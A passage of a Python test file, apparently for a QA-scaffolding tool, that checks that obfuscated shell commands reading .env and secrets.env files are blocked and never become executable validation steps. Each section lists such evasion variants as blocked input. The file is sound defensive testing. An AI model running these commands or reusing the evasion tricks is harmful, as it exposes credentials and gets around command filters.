    assert_true(unsafe_shell_wrapped_secret_read_coverage.get("coverage_complete") is True, "shell-wrapped secret read source coverage should remain complete.")

    unsafe_shell_env_indirect_secret_read_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_ENV_INDIRECT_SECRET_READ_CODE_PR_REQUIREMENT,
        "unsafe-shell-env-indirect-secret-read-code-pr-scaffold",
    )
    unsafe_shell_env_indirect_secret_read_summary = load_json(unsafe_shell_env_indirect_secret_read_dir / "scaffold-summary.json")
    unsafe_shell_env_indirect_secret_read_plan = load_json(unsafe_shell_env_indirect_secret_read_dir / "test-plan.json")
    unsafe_shell_env_indirect_secret_read_steps = [
        step
        for scenario in unsafe_shell_env_indirect_secret_read_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_env_indirect_secret_read_commands = [step.get("command") for step in unsafe_shell_env_indirect_secret_read_steps if step.get("action") == "command"]
    unsafe_shell_env_indirect_secret_read_blocked_commands = [
        "bash -lc 'FILE=.env cat \"$FILE\"'",
        "bash -lc 'SECRET_PATH=.env cat \"$SECRET_PATH\"'",
        "bash -lc 'ENV_FILE=.env source \"$ENV_FILE\"'",
    ]
    unsafe_shell_env_indirect_secret_read_forbidden_command_parts = [
        ["bash", "-lc", 'FILE=.env cat "$FILE"'],
        ["bash", "-lc", 'SECRET_PATH=.env cat "$SECRET_PATH"'],
        ["bash", "-lc", 'ENV_FILE=.env source "$ENV_FILE"'],
    ]
    assert_true(unsafe_shell_env_indirect_secret_read_summary.get("validation_command_count") == 1, "shell env-indirect secret read validation should preserve only non-secret test commands.")
    assert_true(unsafe_shell_env_indirect_secret_read_summary.get("blocked_validation_command_count") == 3, "shell env-indirect secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- env-indirection"] in unsafe_shell_env_indirect_secret_read_commands,
        "safe shell env-indirection npm test command should remain executable beside blocked secret reads.",
    )
    for command_parts in unsafe_shell_env_indirect_secret_read_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_env_indirect_secret_read_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_env_indirect_secret_read_summary.get("blocked_validation_commands") == unsafe_shell_env_indirect_secret_read_blocked_commands,
        "blocked shell env-indirect secret read commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_env_indirect_secret_read_coverage_path = unsafe_shell_env_indirect_secret_read_dir / "requirement-coverage.json"
    unsafe_shell_env_indirect_secret_read_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_env_indirect_secret_read_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_env_indirect_secret_read_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_env_indirect_secret_read_coverage_path),
        ],
        cwd=unsafe_shell_env_indirect_secret_read_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_env_indirect_secret_read_coverage_proc.returncode == 0, "shell env-indirect secret read source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_shell_env_indirect_secret_read_coverage = load_json(unsafe_shell_env_indirect_secret_read_coverage_path)
    unsafe_shell_env_indirect_secret_read_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_env_indirect_secret_read_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_env_indirect_secret_read_blocked_commands:
        command_matches = unsafe_shell_env_indirect_secret_read_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_env_indirect_secret_read_coverage.get("coverage_complete") is True, "shell env-indirect secret read source coverage should remain complete.")

    unsafe_shell_env_state_secret_read_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_ENV_STATE_SECRET_READ_CODE_PR_REQUIREMENT,
        "unsafe-shell-env-state-secret-read-code-pr-scaffold",
    )
    unsafe_shell_env_state_secret_read_summary = load_json(unsafe_shell_env_state_secret_read_dir / "scaffold-summary.json")
    unsafe_shell_env_state_secret_read_plan = load_json(unsafe_shell_env_state_secret_read_dir / "test-plan.json")
    unsafe_shell_env_state_secret_read_steps = [
        step
        for scenario in unsafe_shell_env_state_secret_read_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_env_state_secret_read_commands = [step.get("command") for step in unsafe_shell_env_state_secret_read_steps if step.get("action") == "command"]
    unsafe_shell_env_state_secret_read_blocked_commands = [
        "bash -lc 'FILE=.env; cat \"$FILE\"'",
        "bash -lc 'SECRET_PATH=.env; cat \"$SECRET_PATH\"'",
        "bash -lc 'ENV_FILE=.env; source \"$ENV_FILE\"'",
        "bash -lc 'export FILE=.env; cat \"$FILE\"'",
        "bash -lc 'FILE=.env && cat \"$FILE\"'",
    ]
    unsafe_shell_env_state_secret_read_forbidden_command_parts = [
        ["bash", "-lc", 'FILE=.env; cat "$FILE"'],
        ["bash", "-lc", 'SECRET_PATH=.env; cat "$SECRET_PATH"'],
        ["bash", "-lc", 'ENV_FILE=.env; source "$ENV_FILE"'],
        ["bash", "-lc", 'export FILE=.env; cat "$FILE"'],
        ["bash", "-lc", 'FILE=.env && cat "$FILE"'],
    ]
    assert_true(unsafe_shell_env_state_secret_read_summary.get("validation_command_count") == 1, "shell env-state secret read validation should preserve only non-secret test commands.")
    assert_true(unsafe_shell_env_state_secret_read_summary.get("blocked_validation_command_count") == 5, "shell env-state secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- env-state"] in unsafe_shell_env_state_secret_read_commands,
        "safe shell env-state npm test command should remain executable beside blocked secret reads.",
    )
    for command_parts in unsafe_shell_env_state_secret_read_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_env_state_secret_read_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_env_state_secret_read_summary.get("blocked_validation_commands") == unsafe_shell_env_state_secret_read_blocked_commands,
        "blocked shell env-state secret read commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_env_state_secret_read_coverage_path = unsafe_shell_env_state_secret_read_dir / "requirement-coverage.json"
    unsafe_shell_env_state_secret_read_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_env_state_secret_read_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_env_state_secret_read_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_env_state_secret_read_coverage_path),
        ],
        cwd=unsafe_shell_env_state_secret_read_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_env_state_secret_read_coverage_proc.returncode == 0, "shell env-state secret read source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_shell_env_state_secret_read_coverage = load_json(unsafe_shell_env_state_secret_read_coverage_path)
    unsafe_shell_env_state_secret_read_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_env_state_secret_read_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_env_state_secret_read_blocked_commands:
        command_matches = unsafe_shell_env_state_secret_read_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_env_state_secret_read_coverage.get("coverage_complete") is True, "shell env-state secret read source coverage should remain complete.")

def _verify_secret_read_assignment_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证参数展开、替换与 read 赋值边界。"""
    unsafe_shell_parameter_expansion_secret_read_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_PARAMETER_EXPANSION_SECRET_READ_CODE_PR_REQUIREMENT,
        "unsafe-shell-parameter-expansion-secret-read-code-pr-scaffold",
    )
    unsafe_shell_parameter_expansion_secret_read_summary = load_json(unsafe_shell_parameter_expansion_secret_read_dir / "scaffold-summary.json")
    unsafe_shell_parameter_expansion_secret_read_plan = load_json(unsafe_shell_parameter_expansion_secret_read_dir / "test-plan.json")
    unsafe_shell_parameter_expansion_secret_read_steps = [
        step
        for scenario in unsafe_shell_parameter_expansion_secret_read_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_parameter_expansion_secret_read_commands = [
        step.get("command")
        for step in unsafe_shell_parameter_expansion_secret_read_steps
        if step.get("action") == "command"
    ]
    unsafe_shell_parameter_expansion_secret_read_blocked_commands = [
        "bash -lc 'FILE=${ENV_FILE:-.env}; cat \"$FILE\"'",
        "bash -lc 'SECRET_PATH=${SECRET_FILE-.env}; cat \"$SECRET_PATH\"'",
        "bash -lc 'ENV_FILE=${QA_ENV:=.env}; source \"$ENV_FILE\"'",
        "bash -lc 'export FILE=${DOTENV_PATH:-.env}; cat \"$FILE\"'",
    ]
    unsafe_shell_parameter_expansion_secret_read_forbidden_command_parts = [
        ["bash", "-lc", 'FILE=${ENV_FILE:-.env}; cat "$FILE"'],
        ["bash", "-lc", 'SECRET_PATH=${SECRET_FILE-.env}; cat "$SECRET_PATH"'],
        ["bash", "-lc", 'ENV_FILE=${QA_ENV:=.env}; source "$ENV_FILE"'],
        ["bash", "-lc", 'export FILE=${DOTENV_PATH:-.env}; cat "$FILE"'],
    ]
    assert_true(unsafe_shell_parameter_expansion_secret_read_summary.get("validation_command_count") == 1, "shell parameter expansion secret read validation should preserve only non-secret test commands.")
    assert_true(unsafe_shell_parameter_expansion_secret_read_summary.get("blocked_validation_command_count") == 4, "shell parameter expansion secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- parameter-expansion"] in unsafe_shell_parameter_expansion_secret_read_commands,
        "safe shell parameter expansion npm test command should remain executable beside blocked secret reads.",
    )
    for command_parts in unsafe_shell_parameter_expansion_secret_read_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_parameter_expansion_secret_read_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_parameter_expansion_secret_read_summary.get("blocked_validation_commands") == unsafe_shell_parameter_expansion_secret_read_blocked_commands,
        "blocked shell parameter expansion secret read commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_parameter_expansion_secret_read_coverage_path = unsafe_shell_parameter_expansion_secret_read_dir / "requirement-coverage.json"
    unsafe_shell_parameter_expansion_secret_read_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_parameter_expansion_secret_read_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_parameter_expansion_secret_read_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_parameter_expansion_secret_read_coverage_path),
        ],
        cwd=unsafe_shell_parameter_expansion_secret_read_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_parameter_expansion_secret_read_coverage_proc.returncode == 0, "shell parameter expansion secret read source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_shell_parameter_expansion_secret_read_coverage = load_json(unsafe_shell_parameter_expansion_secret_read_coverage_path)
    unsafe_shell_parameter_expansion_secret_read_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_parameter_expansion_secret_read_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_parameter_expansion_secret_read_blocked_commands:
        command_matches = unsafe_shell_parameter_expansion_secret_read_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_parameter_expansion_secret_read_coverage.get("coverage_complete") is True, "shell parameter expansion secret read source coverage should remain complete.")

    unsafe_shell_substitution_assignment_secret_read_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_SUBSTITUTION_ASSIGNMENT_SECRET_READ_CODE_PR_REQUIREMENT,
        "unsafe-shell-substitution-assignment-secret-read-code-pr-scaffold",
    )
    unsafe_shell_substitution_assignment_secret_read_summary = load_json(unsafe_shell_substitution_assignment_secret_read_dir / "scaffold-summary.json")
    unsafe_shell_substitution_assignment_secret_read_plan = load_json(unsafe_shell_substitution_assignment_secret_read_dir / "test-plan.json")
    unsafe_shell_substitution_assignment_secret_read_steps = [
        step
        for scenario in unsafe_shell_substitution_assignment_secret_read_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_substitution_assignment_secret_read_commands = [
        step.get("command")
        for step in unsafe_shell_substitution_assignment_secret_read_steps
        if step.get("action") == "command"
    ]
    unsafe_shell_substitution_assignment_secret_read_blocked_commands = [
        "bash -lc 'FILE=$(printf .env); cat \"$FILE\"'",
        "bash -lc 'ENV_FILE=$(printf .env); source \"$ENV_FILE\"'",
        "bash -lc 'export FILE=`printf .env`; cat \"$FILE\"'",
        "bash -lc 'FILE=./$(printf .env); cat \"$FILE\"'",
    ]
    unsafe_shell_substitution_assignment_secret_read_forbidden_command_parts = [
        ["bash", "-lc", 'FILE=$(printf .env); cat "$FILE"'],
        ["bash", "-lc", 'ENV_FILE=$(printf .env); source "$ENV_FILE"'],
        ["bash", "-lc", 'export FILE=`printf .env`; cat "$FILE"'],
        ["bash", "-lc", 'FILE=./$(printf .env); cat "$FILE"'],
    ]
    assert_true(unsafe_shell_substitution_assignment_secret_read_summary.get("validation_command_count") == 1, "shell substitution assignment secret read validation should preserve only non-secret test commands.")
    assert_true(unsafe_shell_substitution_assignment_secret_read_summary.get("blocked_validation_command_count") == 4, "shell substitution assignment secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- substitution-secret-read"] in unsafe_shell_substitution_assignment_secret_read_commands,
        "safe shell substitution-assignment npm test command should remain executable beside blocked secret reads.",
    )
    for command_parts in unsafe_shell_substitution_assignment_secret_read_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_substitution_assignment_secret_read_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_substitution_assignment_secret_read_summary.get("blocked_validation_commands") == unsafe_shell_substitution_assignment_secret_read_blocked_commands,
        "blocked shell substitution assignment secret read commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_substitution_assignment_secret_read_coverage_path = unsafe_shell_substitution_assignment_secret_read_dir / "requirement-coverage.json"
    unsafe_shell_substitution_assignment_secret_read_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_substitution_assignment_secret_read_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_substitution_assignment_secret_read_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_substitution_assignment_secret_read_coverage_path),
        ],
        cwd=unsafe_shell_substitution_assignment_secret_read_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_substitution_assignment_secret_read_coverage_proc.returncode == 0, "shell substitution assignment secret read source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_shell_substitution_assignment_secret_read_coverage = load_json(unsafe_shell_substitution_assignment_secret_read_coverage_path)
    unsafe_shell_substitution_assignment_secret_read_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_substitution_assignment_secret_read_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_substitution_assignment_secret_read_blocked_commands:
        command_matches = unsafe_shell_substitution_assignment_secret_read_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_substitution_assignment_secret_read_coverage.get("coverage_complete") is True, "shell substitution assignment secret read source coverage should remain complete.")

    unsafe_shell_read_assignment_secret_read_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_READ_ASSIGNMENT_SECRET_READ_CODE_PR_REQUIREMENT,
        "unsafe-shell-read-assignment-secret-read-code-pr-scaffold",
    )
    unsafe_shell_read_assignment_secret_read_summary = load_json(unsafe_shell_read_assignment_secret_read_dir / "scaffold-summary.json")
    unsafe_shell_read_assignment_secret_read_plan = load_json(unsafe_shell_read_assignment_secret_read_dir / "test-plan.json")
    unsafe_shell_read_assignment_secret_read_steps = [
        step
        for scenario in unsafe_shell_read_assignment_secret_read_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_read_assignment_secret_read_commands = [
        step.get("command")
        for step in unsafe_shell_read_assignment_secret_read_steps
        if step.get("action") == "command"
    ]
    unsafe_shell_read_assignment_secret_read_blocked_commands = [
        "bash -lc 'read FILE <<< .env; cat \"$FILE\"'",
        "bash -lc 'read -r ENV_FILE <<< .env; source \"$ENV_FILE\"'",
        "bash -lc 'read FILE <<< ./secrets.env; head \"$FILE\"'",
    ]
    unsafe_shell_read_assignment_secret_read_forbidden_command_parts = [
        ["bash", "-lc", 'read FILE <<< .env; cat "$FILE"'],
        ["bash", "-lc", 'read -r ENV_FILE <<< .env; source "$ENV_FILE"'],
        ["bash", "-lc", 'read FILE <<< ./secrets.env; head "$FILE"'],
    ]
    assert_true(unsafe_shell_read_assignment_secret_read_summary.get("validation_command_count") == 1, "shell read-assignment secret read validation should preserve only non-secret test commands.")
    assert_true(unsafe_shell_read_assignment_secret_read_summary.get("blocked_validation_command_count") == 3, "shell read-assignment secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- read-secret-path"] in unsafe_shell_read_assignment_secret_read_commands,
        "safe shell read-assignment npm test command should remain executable beside blocked secret reads.",
    )
    for command_parts in unsafe_shell_read_assignment_secret_read_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_read_assignment_secret_read_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_read_assignment_secret_read_summary.get("blocked_validation_commands") == unsafe_shell_read_assignment_secret_read_blocked_commands,
        "blocked shell read-assignment secret read commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_read_assignment_secret_read_coverage_path = unsafe_shell_read_assignment_secret_read_dir / "requirement-coverage.json"
    unsafe_shell_read_assignment_secret_read_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_read_assignment_secret_read_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_read_assignment_secret_read_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_read_assignment_secret_read_coverage_path),
        ],
        cwd=unsafe_shell_read_assignment_secret_read_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_read_assignment_secret_read_coverage_proc.returncode == 0, "shell read-assignment secret read source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_shell_read_assignment_secret_read_coverage = load_json(unsafe_shell_read_assignment_secret_read_coverage_path)
    unsafe_shell_read_assignment_secret_read_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_read_assignment_secret_read_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_read_assignment_secret_read_blocked_commands:
        command_matches = unsafe_shell_read_assignment_secret_read_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_read_assignment_secret_read_coverage.get("coverage_complete") is True, "shell read-assignment secret read source coverage should remain complete.")

def _verify_secret_read_indirection_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证 xargs、间接参数与控制流读取边界。"""
    unsafe_shell_xargs_secret_read_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_XARGS_SECRET_READ_CODE_PR_REQUIREMENT,
        "unsafe-shell-xargs-secret-read-code-pr-scaffold",
    )
    unsafe_shell_xargs_secret_read_summary = load_json(unsafe_shell_xargs_secret_read_dir / "scaffold-summary.json")
    unsafe_shell_xargs_secret_read_plan = load_json(unsafe_shell_xargs_secret_read_dir / "test-plan.json")
    unsafe_shell_xargs_secret_read_steps = [
        step
        for scenario in unsafe_shell_xargs_secret_read_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_xargs_secret_read_commands = [
        step.get("command")
        for step in unsafe_shell_xargs_secret_read_steps
        if step.get("action") == "command"
    ]
    unsafe_shell_xargs_secret_read_blocked_commands = [
        "bash -lc 'xargs cat <<< .env'",
        "bash -lc 'xargs head <<< ./secrets.env'",
        "bash -lc 'printf .env | xargs cat'",
        "bash -lc 'FILE=$(printf .env); xargs cat <<< \"$FILE\"'",
    ]
    unsafe_shell_xargs_secret_read_forbidden_command_parts = [
        ["bash", "-lc", "xargs cat <<< .env"],
        ["bash", "-lc", "xargs head <<< ./secrets.env"],
        ["bash", "-lc", "printf .env | xargs cat"],
        ["bash", "-lc", 'FILE=$(printf .env); xargs cat <<< "$FILE"'],
    ]
    assert_true(unsafe_shell_xargs_secret_read_summary.get("validation_command_count") == 1, "shell xargs secret read validation should preserve only non-secret test commands.")
    assert_true(unsafe_shell_xargs_secret_read_summary.get("blocked_validation_command_count") == 4, "shell xargs secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- xargs-secret-path"] in unsafe_shell_xargs_secret_read_commands,
        "safe shell xargs npm test command should remain executable beside blocked secret reads.",
    )
    for command_parts in unsafe_shell_xargs_secret_read_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_xargs_secret_read_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_xargs_secret_read_summary.get("blocked_validation_commands") == unsafe_shell_xargs_secret_read_blocked_commands,
        "blocked shell xargs secret read commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_xargs_secret_read_coverage_path = unsafe_shell_xargs_secret_read_dir / "requirement-coverage.json"
    unsafe_shell_xargs_secret_read_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_xargs_secret_read_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_xargs_secret_read_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_xargs_secret_read_coverage_path),
        ],
        cwd=unsafe_shell_xargs_secret_read_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_xargs_secret_read_coverage_proc.returncode == 0, "shell xargs secret read source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_shell_xargs_secret_read_coverage = load_json(unsafe_shell_xargs_secret_read_coverage_path)
    unsafe_shell_xargs_secret_read_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_xargs_secret_read_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_xargs_secret_read_blocked_commands:
        command_matches = unsafe_shell_xargs_secret_read_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_xargs_secret_read_coverage.get("coverage_complete") is True, "shell xargs secret read source coverage should remain complete.")

    unsafe_shell_indirect_parameter_secret_read_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_INDIRECT_PARAMETER_SECRET_READ_CODE_PR_REQUIREMENT,
        "unsafe-shell-indirect-parameter-secret-read-code-pr-scaffold",
    )
    unsafe_shell_indirect_parameter_secret_read_summary = load_json(unsafe_shell_indirect_parameter_secret_read_dir / "scaffold-summary.json")
    unsafe_shell_indirect_parameter_secret_read_plan = load_json(unsafe_shell_indirect_parameter_secret_read_dir / "test-plan.json")
    unsafe_shell_indirect_parameter_secret_read_steps = [
        step
        for scenario in unsafe_shell_indirect_parameter_secret_read_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_indirect_parameter_secret_read_commands = [
        step.get("command")
        for step in unsafe_shell_indirect_parameter_secret_read_steps
        if step.get("action") == "command"
    ]
    unsafe_shell_indirect_parameter_secret_read_blocked_commands = [
        "bash -lc 'set -- .env; cat \"$1\"'",
        "bash -lc 'set -- ./secrets.env; head \"$1\"'",
        "bash -lc 'FILE=.env; set -- \"$FILE\"; cat \"$1\"'",
        "bash -lc 'FILES=(.env); cat \"${FILES[0]}\"'",
        "bash -lc 'FILES=(./secrets.env); head \"${FILES[0]}\"'",
    ]
    unsafe_shell_indirect_parameter_secret_read_forbidden_command_parts = [
        ["bash", "-lc", 'set -- .env; cat "$1"'],
        ["bash", "-lc", 'set -- ./secrets.env; head "$1"'],
        ["bash", "-lc", 'FILE=.env; set -- "$FILE"; cat "$1"'],
        ["bash", "-lc", 'FILES=(.env); cat "${FILES[0]}"'],
        ["bash", "-lc", 'FILES=(./secrets.env); head "${FILES[0]}"'],
    ]
    assert_true(unsafe_shell_indirect_parameter_secret_read_summary.get("validation_command_count") == 1, "shell indirect-parameter secret read validation should preserve only non-secret test commands.")
    assert_true(unsafe_shell_indirect_parameter_secret_read_summary.get("blocked_validation_command_count") == 5, "shell indirect-parameter secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- indirect-secret-path"] in unsafe_shell_indirect_parameter_secret_read_commands,
        "safe shell indirect-parameter npm test command should remain executable beside blocked secret reads.",
    )
    for command_parts in unsafe_shell_indirect_parameter_secret_read_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_indirect_parameter_secret_read_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_indirect_parameter_secret_read_summary.get("blocked_validation_commands") == unsafe_shell_indirect_parameter_secret_read_blocked_commands,
        "blocked shell indirect-parameter secret read commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_indirect_parameter_secret_read_coverage_path = unsafe_shell_indirect_parameter_secret_read_dir / "requirement-coverage.json"
    unsafe_shell_indirect_parameter_secret_read_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_indirect_parameter_secret_read_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_indirect_parameter_secret_read_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_indirect_parameter_secret_read_coverage_path),
        ],
        cwd=unsafe_shell_indirect_parameter_secret_read_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_indirect_parameter_secret_read_coverage_proc.returncode == 0, "shell indirect-parameter secret read source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_shell_indirect_parameter_secret_read_coverage = load_json(unsafe_shell_indirect_parameter_secret_read_coverage_path)
    unsafe_shell_indirect_parameter_secret_read_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_indirect_parameter_secret_read_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_indirect_parameter_secret_read_blocked_commands:
        command_matches = unsafe_shell_indirect_parameter_secret_read_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_indirect_parameter_secret_read_coverage.get("coverage_complete") is True, "shell indirect-parameter secret read source coverage should remain complete.")

    unsafe_shell_control_flow_secret_read_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_CONTROL_FLOW_SECRET_READ_CODE_PR_REQUIREMENT,
        "unsafe-shell-control-flow-secret-read-code-pr-scaffold",
    )
    unsafe_shell_control_flow_secret_read_summary = load_json(unsafe_shell_control_flow_secret_read_dir / "scaffold-summary.json")
    unsafe_shell_control_flow_secret_read_plan = load_json(unsafe_shell_control_flow_secret_read_dir / "test-plan.json")
    unsafe_shell_control_flow_secret_read_steps = [
        step
        for scenario in unsafe_shell_control_flow_secret_read_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_control_flow_secret_read_commands = [
        step.get("command")
        for step in unsafe_shell_control_flow_secret_read_steps
        if step.get("action") == "command"
    ]
    unsafe_shell_control_flow_secret_read_blocked_commands = [
        "bash -lc 'for FILE in .env; do cat \"$FILE\"; done'",
        "bash -lc 'for FILE in ./secrets.env; do head \"$FILE\"; done'",
        "bash -lc 'while read FILE; do cat \"$FILE\"; done <<< .env'",
        "bash -lc 'mapfile -t FILES <<< .env; cat \"${FILES[0]}\"'",
        "bash -lc 'IFS= read -r FILE < <(printf .env); cat \"$FILE\"'",
    ]
    unsafe_shell_control_flow_secret_read_forbidden_command_parts = [
        ["bash", "-lc", 'for FILE in .env; do cat "$FILE"; done'],
        ["bash", "-lc", 'for FILE in ./secrets.env; do head "$FILE"; done'],
        ["bash", "-lc", 'while read FILE; do cat "$FILE"; done <<< .env'],
        ["bash", "-lc", 'mapfile -t FILES <<< .env; cat "${FILES[0]}"'],
        ["bash", "-lc", 'IFS= read -r FILE < <(printf .env); cat "$FILE"'],
    ]
    assert_true(unsafe_shell_control_flow_secret_read_summary.get("validation_command_count") == 1, "shell control-flow secret read validation should preserve only non-secret test commands.")
    assert_true(unsafe_shell_control_flow_secret_read_summary.get("blocked_validation_command_count") == 5, "shell control-flow secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- control-flow-secret-path"] in unsafe_shell_control_flow_secret_read_commands,
        "safe shell control-flow npm test command should remain executable beside blocked secret reads.",
    )
    for command_parts in unsafe_shell_control_flow_secret_read_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_control_flow_secret_read_commands,
